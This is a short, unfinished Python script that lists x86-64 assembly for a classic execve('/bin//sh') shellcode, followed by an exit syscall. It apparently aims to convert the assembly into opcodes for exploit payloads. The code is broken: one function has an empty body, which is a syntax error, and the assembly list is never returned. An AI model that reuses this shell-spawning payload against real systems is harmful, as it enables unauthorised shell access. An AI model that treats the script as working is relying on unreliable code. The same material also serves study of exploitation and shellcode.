#!/usr/bin/env python

def recup_code_assembleur():
    code_asm = [
        'xor rax,rax',
        'push rax',
        'mov rbx,0x68732f2f6e69622f',
        'push rbx',
        'mov rdi,rsp',
        'push rax',
        'mov rdx,rsp',
        'push rdi',
        'mov rsi,rsp',
        'mov al,59',
        'syscall',
        'xor rax,rax',
        'mov rdi,rax',
        'mov al,60',
        'syscall',
    ]

def base_opcode():


def main():
    code_assembleur = recup_code_assembleur()


if __name__ == "__main__":
    main()